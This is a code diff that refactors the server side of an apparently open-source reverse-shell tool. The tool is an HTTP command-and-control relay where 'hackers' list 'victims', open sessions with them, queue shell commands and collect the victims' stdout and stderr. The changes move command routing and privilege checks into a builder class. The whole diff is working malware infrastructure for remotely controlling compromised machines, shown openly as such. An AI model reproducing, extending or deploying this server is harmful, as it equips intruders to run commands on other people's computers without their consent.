@@ -8,12 +8,16 @@ from binascii import Error as b64decodeError
 from dataclasses import dataclass
 from http import HTTPMethod, HTTPStatus
 from http.server import BaseHTTPRequestHandler
-from typing import Any, Callable, Literal, Optional
+from typing import Literal, Optional
 
 import typ.json as js
 
 import reverse_shell.server.config as cfg
 import reverse_shell.server.database as db
+from reverse_shell.server.server_commands import (
+    ServerCommands,
+    ServerCommandPrivilege as SCP,
+)
 import reverse_shell.server.sessions as ss
 import reverse_shell.utils as ut
 
@@ -58,54 +62,99 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def __init__(
         self,
         config: cfg.Config,
-        sessions: ss.SessionManager,
+        session_manager: ss.SessionManager,
         database: db.Database,
         *args,
         **kwargs,
     ):
-        # Our configuration: tokens, ip, port and etc...
+        # ---- Our configuration: tokens, ip, port and etc...
         self.config = config
         self.database = database
 
-        # Hacker and victim sessions
-        self.hacking_sessions = sessions
+        # ---- Our session manager
+        self.session_manager = session_manager
 
-        # Defining the server_command-function relation using a dict
-        self.server_command_functions: dict[
-            str, list[HTTPMethod | Callable[..., Any]]
-        ] = {
-            ut.ServerCommands.post_cmd: [self.handle_cmd_post_cmd, HTTPMethod.POST],
-            ut.ServerCommands.register: [self.handle_cmd_register, HTTPMethod.POST],
-            ut.ServerCommands.create_session: [
-                self.handle_cmd_create_session,
-                HTTPMethod.POST,
-            ],
-            ut.ServerCommands.post_res: [self.handle_cmd_post_res, HTTPMethod.POST],
-            ut.ServerCommands.get_session: [
-                self.handle_cmd_get_session,
-                HTTPMethod.GET,
-            ],
-            ut.ServerCommands.fetch_cmd: [
-                self.handle_cmd_fetch_cmd,
-                HTTPMethod.GET,
-            ],
-            ut.ServerCommands.fetch_res: [
-                self.handle_cmd_fetch_res,
-                HTTPMethod.GET,
-            ],
-            ut.ServerCommands.list_victims: [
-                self.handle_cmd_list_victims,
-                HTTPMethod.GET,
-            ],
-            ut.ServerCommands.exit_session: [
-                self.handle_cmd_exit_session,
-                HTTPMethod.DELETE,
-            ],
-            ut.ServerCommands.delete_hacker: [
-                self.handle_cmd_delete_hacker,
-                HTTPMethod.DELETE,
-            ],
-        }
+        # ---- Defining the server_commands
+        # Endpoints obtained from the config
+        endpoints = self.config.server_cmd_endpoints
+
+        self.server_commands: ServerCommands = (
+            ServerCommands.Builder()
+            # ---- Register
+            .add_command(
+                cmd_name=ut.ServerCommand.register,
+                command_handler=self.handle_cmd_register,
+                endpoint=endpoints[ut.ServerCommand.register],
+                http_method=HTTPMethod.POST,
+                privilege=SCP.for_all,
+            )
+            # ---- Hacker Commands
+            .add_command(
+                cmd_name=ut.ServerCommand.post_cmd,
+                command_handler=self.handle_cmd_post_cmd,
+                endpoint=endpoints[ut.ServerCommand.post_cmd],
+                http_method=HTTPMethod.POST,
+                privilege=SCP.hacker_level,
+            )
+            .add_command(
+                cmd_name=ut.ServerCommand.fetch_res,
+                command_handler=self.handle_cmd_fetch_res,
+                endpoint=endpoints[ut.ServerCommand.fetch_res],
+                http_method=HTTPMethod.GET,
+                privilege=SCP.hacker_level,
+            )
+            .add_command(
+                cmd_name=ut.ServerCommand.delete_hacker,
+                command_handler=self.handle_cmd_delete_hacker,
+                endpoint=endpoints[ut.ServerCommand.delete_hacker],
+                http_method=HTTPMethod.DELETE,
+                privilege=SCP.hacker_level,
+            )
+            .add_command(
+                cmd_name=ut.ServerCommand.list_victims,
+                command_handler=self.handle_cmd_list_victims,
+                endpoint=endpoints[ut.ServerCommand.list_victims],
+                http_method=HTTPMethod.GET,
+                privilege=SCP.hacker_level,
+            )
+            .add_command(
+                cmd_name=ut.ServerCommand.exit_session,
+                command_handler=self.handle_cmd_exit_session,
+                endpoint=endpoints[ut.ServerCommand.exit_session],
+                http_method=HTTPMethod.DELETE,
+                privilege=SCP.hacker_level,
+            )
+            .add_command(
+                cmd_name=ut.ServerCommand.create_session,
+                command_handler=self.handle_cmd_create_session,
+                endpoint=endpoints[ut.ServerCommand.create_session],
+                http_method=HTTPMethod.POST,
+                privilege=SCP.hacker_level,
+            )
+            # ---- Victim commands
+            .add_command(
+                cmd_name=ut.ServerCommand.get_session,
+                command_handler=self.handle_cmd_get_session,
+                endpoint=endpoints[ut.ServerCommand.get_session],
+                http_method=HTTPMethod.GET,
+                privilege=SCP.victim_level,
+            )
+            .add_command(
+                cmd_name=ut.ServerCommand.fetch_cmd,
+                command_handler=self.handle_cmd_fetch_cmd,
+                endpoint=endpoints[ut.ServerCommand.fetch_cmd],
+                http_method=HTTPMethod.GET,
+                privilege=SCP.victim_level,
+            )
+            .add_command(
+                cmd_name=ut.ServerCommand.post_res,
+                command_handler=self.handle_cmd_post_res,
+                endpoint=endpoints[ut.ServerCommand.post_res],
+                http_method=HTTPMethod.POST,
+                privilege=SCP.victim_level,
+            )
+            .build()
+        )
 
         # Initializing our parent, cuz of respect.
         super().__init__(*args, **kwargs)
@@ -151,7 +200,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         self.c_send_error(HTTPStatus.UNAUTHORIZED)
         return False
 
-    def get_client_type_from_db(self, client_id: str) -> Optional[int]:
+    def get_client_type_from_db(self, client_id: str) -> Optional[ut.ClientType]:
         """Gets the client type of a specified client from the database and return `None` if not found.
         This could also be a means to check if the client has verified itself.
         Since there could be no client that is verified but has not registered itself.
@@ -173,9 +222,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 ut.ClientType.hacker,
                 ut.ClientType.victim,
             ]
-            if usr_client_type == client_type.__str__()
+            if usr_client_type == client_type.value.__str__()
         ]
-        return result[0]
+        return ut.ClientType(result[0])
 
     def get_header_token(
         self, token_name: str, fallback: Optional[str] = None
@@ -224,10 +273,6 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 [victim_id, *[None for _ in range(5)]],
             )
 
-    def check_verified_for_cmd(self, cmd: str, client_type: int) -> bool:
-        """Checks if a client is verified to access a server command."""
-        return client_type in self.config.server_cmd_privileges.get(cmd, [])
-
     def get_req_body(self) -> Optional[str]:
         """Decodes and reads the body of the request and returns the parsed response.
         Returns `None` if a decode error occurred."""
@@ -263,7 +308,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         return result[0][0]
 
     def validate_session(
-        self, client_id: str, client_type: int, requested_session: str
+        self, client_id: str, client_type: ut.ClientType, requested_session_id: str
     ) -> ut.HandlerResponse:
         """Validate the requested session with the session_id the client is actually in.
         Returns a `HandlerResponse` object that can be returned from the command handler methods.
@@ -271,17 +316,17 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Very simple we'll check one condition that's
         # if the requested_session_id and the real_session_id match
-        real_session_id = self.hacking_sessions.get_session_id(client_id)
+        real_session_id = self.session_manager.get_session_id(client_id)
 
         # This includes all cases this works even if the client requesting
         # is not in a session. Because when it isn't the real_session_id becomes
         # None and therefore will not match to requested_session
-        if real_session_id != requested_session or real_session_id is None:
+        if real_session_id != requested_session_id or real_session_id is None:
             return ut.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
         # We also need to check if the session requested is not a dead session
         # in other words if the hacker didn't exit the session.
-        if not self.hacking_sessions.check_session_alive(requested_session):
+        if not self.session_manager.check_session_alive(requested_session_id):
             if client_type == ut.ClientType.hacker:
                 return ut.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
             elif client_type == ut.ClientType.victim:
@@ -290,7 +335,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Now if the session is alive and return responses for that
         # we'll use the session_id, real_session_id, to fetch the session
         # and check the status of the other client in that session
-        real_session = self.hacking_sessions.get_session(real_session_id)
+        real_session = self.session_manager.get_session(real_session_id)
 
         # Fixed client mis match
         dict_key: Literal["hacker_id", "victim_id"] = "hacker_id"
@@ -316,7 +361,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     # ---------- Server command handler methods ---------- #
 
     def handle_cmd_list_victims(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handles the 'list_victims' command that allows a hacker to list victims with their information(specs)."""
         # Ok so this is going to be simple, open the database, read all the clients and
@@ -345,7 +390,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                     "status": victim_info[6],
                 }
                 for victim_info in victims
-                if not self.hacking_sessions.check_client_in_session(
+                if not self.session_manager.check_client_in_session(
                     victim_info[0]
                 )  # Means filtering the ones that are currently in a session out
             ]
@@ -362,7 +407,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         )
 
     def handle_cmd_exit_session(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handles the exit_session that allows hackers to dismiss a session with a victim.
         The victim will be also notified and will hop out of the session."""
@@ -382,13 +427,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # And then remove the hacker from the client_list
         # and also change the hacker_id value in the session
         # to None.
-        self.hacking_sessions.kill_session(session_id)
+        self.session_manager.kill_session(session_id)
 
         # Respond to the client with an OK
         return ut.HandlerResponse(True, HTTPStatus.OK)
 
     def handle_cmd_register(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handles the 'register' command that allows clients to be registered(stored in the servers database)."""
         # First let's check if the user is already in the database
@@ -405,7 +450,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # If our user is valid then we can maybe add him to the database
         client_insert_op = self.database.execute(
-            "INSERT INTO clients VALUES(?, ?, 0.0, 0)", [client_id, client_type]
+            "INSERT INTO clients VALUES(?, ?, 0.0, 0)", [client_id, client_type.value]
         )
 
         if client_insert_op is None:
@@ -424,12 +469,12 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         return ut.HandlerResponse(True, HTTPStatus.OK)
 
     def handle_cmd_get_session(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handle the get_session command that allows victims to obtain a session_id key if any hacker
         created a session with them."""
 
-        session_id = self.hacking_sessions.get_session_id(client_id)
+        session_id = self.session_manager.get_session_id(client_id)
 
         if session_id is None:
             # This means the victim is not in a session.
@@ -445,7 +490,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         )
 
     def handle_cmd_fetch_cmd(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handle fetch_cmd commands that the victim will call in a loop to obtain the latest
         commands that the hacker has sent."""
@@ -461,7 +506,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if response.res_code == HTTPStatus.GONE:
             # That means the session is dead and we need to notify the victim
             # that it is. .i.e send the termination response code and also remove the session.
-            self.hacking_sessions.remove_session(session_id)
+            self.session_manager.remove_session(session_id)
 
         if not response.successful:
             return response
@@ -469,7 +514,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Ok now we're sure we have an active session let's now
         # send the victim the commands, but if the command is None
         # rather send a response with no_content
-        command = self.hacking_sessions.get_command(session_id)
+        command = self.session_manager.get_command(session_id)
 
         if command is None:
             return ut.HandlerResponse(False, HTTPStatus.NO_CONTENT)
@@ -487,7 +532,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         )
 
     def handle_cmd_fetch_res(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handle the fetch_res command that allows hackers to get the latest responses in
         individual lines with metadata attached.
@@ -511,7 +556,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Before that we need to check the response and if it is an
         # empty response
-        raw_response = self.hacking_sessions.get_response(requested_session_id)
+        raw_response = self.session_manager.get_response(requested_session_id)
 
         if len(raw_response) == 0:
             # If there was no content
@@ -527,7 +572,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         )
 
     def handle_cmd_post_res(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handles the post_res command that allows victims to post their responses to the session
         for hackers to access."""
@@ -548,14 +593,14 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if validate_session_response.res_code == HTTPStatus.GONE:
             # That means the session is dead and we need to notify the victim
             # that it is. .i.e send the termination response code and also remove the session.
-            self.hacking_sessions.remove_session(data.session_id)
+            self.session_manager.remove_session(data.session_id)
 
         if not validate_session_response.successful:
             return validate_session_response
 
         if not data.empty:
             # Ok else, let's send the success code and insert the response in the session
-            self.hacking_sessions.insert_response(
+            self.session_manager.insert_response(
                 data.session_id,
                 data.response.stdout,
                 data.response.stderr,
@@ -566,7 +611,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         return ut.HandlerResponse(True, HTTPStatus.OK)
 
     def handle_cmd_post_cmd(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handles the 'post_cmd' command that allows hackers to issue a command for the respective victims in
         their sessions to execute."""
@@ -593,13 +638,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if not data.empty:
             # If we are in session with the victim and satisfy all the other requirements
             # we can proceed by inserting the command in the session comm.
-            self.hacking_sessions.insert_command(data.session_id, data.command)
+            self.session_manager.insert_command(data.session_id, data.command)
 
         # If all went good, lets once again return the OK response
         return ut.HandlerResponse(True, HTTPStatus.CREATED)
 
     def handle_cmd_create_session(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Handles the 'create_session' command that allows hackers to create sessions
         with victims."""
@@ -623,8 +668,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Check if the hacker himself is even in another session
         # so he is trying to create multiple sessions with multiple victims
         if (
-            self.hacking_sessions.check_client_in_session(victim_id)
-            or self.hacking_sessions.check_client_in_session(client_id)
+            self.session_manager.check_client_in_session(victim_id)
+            or self.session_manager.check_client_in_session(client_id)
             or self.get_client_status(victim_id) == 0
         ):
             # This means the victim is already in session with another hacker
@@ -633,7 +678,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # If the victim is valid and not already in session with somebody else
         # let's put him in a session with the hacker.
-        session_id = self.hacking_sessions.add_session(client_id, victim_id)
+        session_id = self.session_manager.add_session(client_id, victim_id)
         # Encode the session_id with base64 and turn it to bytes
         session_id_bytes = ut.encode_token(session_id).encode("utf8")
 
@@ -646,7 +691,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         )
 
     def handle_cmd_delete_hacker(
-        self, client_id: str, client_type: int, req_body: str | None
+        self, client_id: str, client_type: ut.ClientType, req_body: str | None
     ):
         """Lets the hacker delete itself from the server database."""
         # Delete the hacker from the database
@@ -660,7 +705,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def execute_command(
         self,
         client_id: str,
-        command: str,
+        command: ut.ServerCommand,
         handler_func,
         get_client_type_from_headers: bool = False,
     ):
@@ -671,10 +716,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         hacker_token = self.get_header_token("hacker-token")
 
-        legit_user: dict[str, bool] = {
-            ut.ClientType.hacker.__str__(): hacker_token is not None
+        client_type_has_token: dict[str, bool] = {
+            ut.ClientType.hacker.value.__str__(): hacker_token is not None
             and hacker_token == self.config.hacker_token,
-            ut.ClientType.victim.__str__(): True,
+            ut.ClientType.victim.value.__str__(): True,
         }
 
         if get_client_type_from_headers:
@@ -686,9 +731,15 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
             client_type = self.headers.get("client-type", None)
 
-            if client_type is not None and legit_user.get(client_type, False):
+            if client_type is not None and client_type_has_token.get(
+                client_type, False
+            ):
+                # Turn the client_type to the ut.ClientType
+                client_type = ut.ClientType(int(client_type))
                 # Let's check if the client is able to access the server command
-                if self.check_verified_for_cmd(command, int(client_type)):
+                if self.server_commands.check_client_verified_for_cmd(
+                    command, client_type
+                ):
                     legit_client = True
 
         else:
@@ -704,14 +755,16 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 return self.end_headers()
 
             # Check if the client has needed tokens for it's type
-            has_tokens = legit_user[client_type.__str__()]
+            has_tokens = client_type_has_token[client_type.value.__str__()]
 
             # if the client_type is None it means there is no client
             # with the client_id we gave so let's tell the user that
             # he made an unauthorized request.
             if (
                 client_type is not None
-                and self.check_verified_for_cmd(command, client_type)
+                and self.server_commands.check_client_verified_for_cmd(
+                    command, client_type
+                )
                 and has_tokens
             ):
                 legit_client = True
@@ -721,7 +774,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             self.c_send_error(HTTPStatus.UNAUTHORIZED)
             return
 
-        if command != ut.ServerCommands.register:
+        if command != ut.ServerCommand.register:
             # Update the status and last checked time of
             # the client.
 
@@ -794,7 +847,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         client_id = self.headers.get("client-id").__str__()
 
         # the self.path is the command's id in this case
-        command = self.config.server_cmds.get(self.path, None)
+        command = self.server_commands.get_command_by_endpoint(self.path)
 
         if command is None:
             # The path requested doesn't match the server_cmds so tell the user that using a 404 error
@@ -802,7 +855,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return
 
         # Now let's check if the path(command) requested is available in this method
-        handler, required_method = self.server_command_functions[command]
+        required_method = self.server_commands.get_command_method(command)
+        handler = self.server_commands.get_command_handler(command)
 
         if required_method != method:
             # If this path(command) is not meant for this particular
@@ -816,7 +870,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             command,
             handler,
             get_client_type_from_headers=(
-                True if command == ut.ServerCommands.register else False
+                True if command == ut.ServerCommand.register else False
             ),
         )
 
